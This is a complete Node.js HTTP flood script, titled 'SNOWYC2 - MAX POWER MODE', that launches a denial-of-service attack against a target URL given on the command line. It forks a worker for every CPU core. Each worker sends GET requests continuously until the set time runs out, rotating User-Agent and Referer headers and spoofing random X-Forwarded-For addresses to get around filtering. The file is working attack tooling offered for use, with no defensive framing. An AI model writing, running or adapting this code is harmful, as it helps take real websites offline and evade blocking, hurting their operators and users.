const cluster = require('cluster');
const os = require('os');
const fs = require('fs');
const axios = require('axios');
const http = require('http');
const https = require('https');

const USER_AGENTS = loadLines('ua.txt');
const REFERERS = loadLines('refs.txt');

const TARGET = process.argv[2];
const DURATION = parseInt(process.argv[3]) * 1000;
const WORKERS = os.cpus().length;
const REQUEST_TIMEOUT = 5000;
const END_TIME = Date.now() + DURATION;

if (!TARGET || isNaN(DURATION)) {
    console.log("Usage: node attack.js <target> <duration_seconds>");
    process.exit(1);
}

function loadLines(file) {
    try {
        return fs.readFileSync(file, 'utf8')
            .split('\n')
            .map(l => l.trim())
            .filter(Boolean);
    } catch {
        return [];
    }
}

function getHeaders() {
    return {
        'User-Agent': USER_AGENTS[Math.floor(Math.random() * USER_AGENTS.length)],
        'Referer': REFERERS[Math.floor(Math.random() * REFERERS.length)],
        'X-Forwarded-For': Array(4).fill().map(() => Math.floor(Math.random() * 255)).join('.')
    };
}

async function fire(target) {
    const isHttps = target.startsWith('https');
    while (Date.now() < END_TIME) {
        const headers = getHeaders();
        try {
            await axios.get(target, {
                headers,
                timeout: REQUEST_TIMEOUT,
                httpAgent: new http.Agent({ keepAlive: true }),
                httpsAgent: new https.Agent({ keepAlive: true })
            });
        } catch (_) { }
    }
}

if (cluster.isMaster) {
    console.log(`\nSNOWYC2 - MAX POWER MODE`);
    console.log('='.repeat(60));
    console.log(`TARGET       : ${TARGET}`);
    console.log(`DURATION     : ${DURATION / 1000}s`);
    console.log(`CPU CORES    : ${WORKERS}`);
    console.log('='.repeat(60));

    for (let i = 0; i < WORKERS; i++) {
        cluster.fork();
    }

    cluster.on('exit', (worker, code, signal) => {
        console.log(`Worker ${worker.process.pid} exited.`);
    });
} else {
    fire(TARGET);
}
